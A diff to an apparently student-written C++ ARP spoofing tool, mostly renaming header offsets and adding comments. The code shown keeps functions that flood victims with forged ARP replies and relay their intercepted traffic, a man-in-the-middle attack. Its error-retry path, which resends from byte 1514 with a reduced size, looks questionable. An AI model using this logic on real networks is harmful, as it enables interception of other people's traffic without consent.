@@ -86,14 +86,13 @@ Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
 	int flag=0;
 	EthHdr* ethinfo=(EthHdr*)packet;
-	IpHdr* ipinfo=(IpHdr*)(packet+14);
+	IpHdr* ipinfo=(IpHdr*)(packet+ETHHDRSIZE);
 	int size=len;
 	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
 	memcpy(relaypacket, packet, sizeof(char)*size);
 	EthHdr* ethhdr=(EthHdr*)relaypacket;
-	IpHdr* iphdr=(IpHdr*)(relaypacket+14);
-	Ip dip=Ip(ntohl((uint32_t)iphdr->ip_src));
-	for(int i=0; i<idx; i++){
+	IpHdr* iphdr=(IpHdr*)(relaypacket+ETHHDRSIZE);
+	for(int i=0; i<idx; i++){///searching for matched ip
 		if(spoofarr[i].smac_==ethhdr->smac_){
 			flag=1;
 			ethhdr->smac_=mmac;
@@ -101,11 +100,12 @@ void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
 			break;
 		}
 	}
-	if(flag==1){
+	if(flag==1){//if matched
+		EthTcpPacket* tcp=(EthTcpPacket*)relaypacket;
 		int res = pcap_sendpacket(handle, relaypacket, size);
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n",res, pcap_geterr(handle));
-			res = pcap_sendpacket(handle, relaypacket+1514, size-1514);
+			res = pcap_sendpacket(handle, relaypacket+1514, size-1514); //if error, send again
 			if (res != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s Again\n",res, pcap_geterr(handle));
 			}
@@ -113,6 +113,7 @@ void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
 	}
 	free(relaypacket);	
 }
+//send infect pacet to all pairs
 void SendInfectFlood(pcap_t* handle){
 	for(int i=0; i<idx; i++){
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
@@ -121,6 +122,7 @@ void SendInfectFlood(pcap_t* handle){
 			}
 	}
 }
+//send arp reply to targetd pair
 void SendInfect(pcap_t* handle, Ip sip){
 	for(int i=0; i<idx; i++){
 		if((uint32_t)spoofarr[i].sip_==ntohl(sip)){
@@ -133,17 +135,18 @@ void SendInfect(pcap_t* handle, Ip sip){
 		}
 	}
 }
+//parsing and return type of packet
 int parsing(const u_char* packet, Ip mip){
 	EthHdr* ethhdr=(EthHdr*)packet;
 	if(ntohs(ethhdr->type_)==EthHdr::Arp){
-		ArpHdr* arphdr=(ArpHdr*)(packet+14);
+		ArpHdr* arphdr=(ArpHdr*)(packet+ETHHDRSIZE);
 		if(ntohs(arphdr->op_)==ArpHdr::Request)
 			return INFECT;
 	}
 	else if(ntohs(ethhdr->type_)==EthHdr::Ip4 || ntohs(ethhdr->type_)==EthHdr::Ip6 ){
-		IpHdr* iphdr=(IpHdr*)(packet+14);
+		IpHdr* iphdr=(IpHdr*)(packet+ETHHDRSIZE);
 		Ip dip=ntohl(iphdr->ip_dst);
-		if(dip==mip)
+		if(dip==mip)// own to me
 			return -1;
 		for(int i=0; i<idx; i++){
 			if(ethhdr->smac_==spoofarr[i].smac_)
@@ -152,6 +155,7 @@ int parsing(const u_char* packet, Ip mip){
 	}
 	return -1;
 }
+//initialize spoofing pair array
 void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
 	EthArpPacket packet;
 	Mac smac=getmac(handle,myip,senderip,mmac);
